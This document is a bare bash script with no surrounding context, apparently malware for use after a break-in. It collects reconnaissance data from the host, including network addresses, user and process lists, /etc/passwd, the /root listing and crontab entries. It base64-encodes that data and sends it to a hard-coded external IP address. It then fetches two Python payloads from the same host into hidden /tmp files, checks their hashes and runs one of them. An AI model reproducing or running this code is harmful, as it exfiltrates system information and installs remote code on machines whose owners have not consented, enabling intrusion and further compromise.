#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
export PYTHONPATH=/tmp/imp
W1="cc99143b6205f4b78226c76206ddecc7"
W2="927080f39b02896422f3560d8113c7fe"
getv() {
  for i in 1 2 3 4 5; do
    curl -sm60 "$1" -o "$2" 2>/dev/null
    H=$(md5sum "$2" 2>/dev/null | cut -d" " -f1)
    [ "$H" = "$3" ] && return 0
    sleep 4
  done
  return 1
}
LF=/tmp/.NDW5.txt
: > "$LF"
getv http://131.123.43.239/nds3.py /tmp/.nds5.py "$W1" || echo "nds5 DL_FAIL" >> "$LF"
getv http://131.123.43.239/sv3.py /tmp/.sv5.py "$W2" || echo "sv5 DL_FAIL" >> "$LF"
if [ -s "$LF" ]; then
  curl -sm30 -X POST --data-binary @"$LF" http://131.123.43.239/up -H "X-Name: mel5_ndwrap"
  exit 0
fi
cp /tmp/.sv5.py /tmp/.svc.py
python3 /tmp/.nds5.py
echo NDRUN5_DONE

